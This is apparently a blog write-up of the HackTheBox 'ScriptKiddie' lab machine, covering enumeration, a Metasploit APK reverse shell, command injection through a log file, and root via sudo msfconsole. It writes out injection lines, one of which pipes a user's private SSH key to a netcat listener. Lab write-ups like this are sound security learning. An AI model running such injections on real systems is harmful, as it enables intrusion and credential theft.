---
author:
  name: "papadope"
date: 2021-01-28
linktitle: ScriptKiddie
type:
- post
title: ScriptKiddie
weight: 10
series:
- HackTheBox
---

![Room Image](/scriptkiddie/room.png)

## Enumeration

From a really quick nmap we can realize that there are 2 open ports on the machine.

![nmap](/scriptkiddie/nmap.png)

---

## Web application

After getting that 5000 port I checked the code first. Nothing useful there. Tried to use windows or linux but the only thing that was working was android. I searched for msf exploits and I found that :

![msfvenom](/scriptkiddie/msfvenom.png)

I started the metasploit and I tried that exploit.

I created an apk file with the metasploit module and I upload the file picking the android in the drop down menu.

Started a netcat listener on the port I chose and I got in as Kid user.

![reverseshell](/scriptkiddie/gettingreverse.png)

---

## Quest for Happiness

After searching in the box on how to get root I saw another user named **pwn**

![pwnuser](/scriptkiddie/pwnuser.png)

That user inside his home directory has a script called **scanlosers.sh** that interacts with the app we saw in the 5000 port. When you try to inject something inside the searchsploit section, it does an automated nmap against your ip.

After injecting some values in the script by simply echoing some random values inside the hackers file in **/home/kid/logs/hackers** we can quickly realize that we can do some smart stuff with that. 🚀

---

## Becoming the pwn user

I actually thought a single way to get in as a user to be honest.

* **echo "1 2 & python3 -m http.server 8888" > hackers**

You can go now to your browser and put the box ip:port and download your key!

The way below is how a great hacker & a good friend of mine did it :

* **echo "1 2 & cat /home/pwn/.ssh/id_rsa|nc ip port" > hackers**

This will echo the id_rsa key of the pwn user directly to your nc listener.

Here I got helped by [Mentats](https://tryhackme.com/p/mentats). IMO he is going to be an excellent penetration tester 😁

## Privilege Escalation

After getting that id_rsa and ssh as pwn user you can instantly realize that you can run msfconsole as sudo.

![sudo](/scriptkiddie/sudo-l.png)

Really straightforward after that. Just execute :

**sudo /opt/metasploit-framework-6.0.9/msfconsole**

And type *id*!

![root](/scriptkiddie/root.png)

To be more familiar you can execute **/bin/bash** inside msfconsole to get a beautiful shell too.

Thank you very much for reading.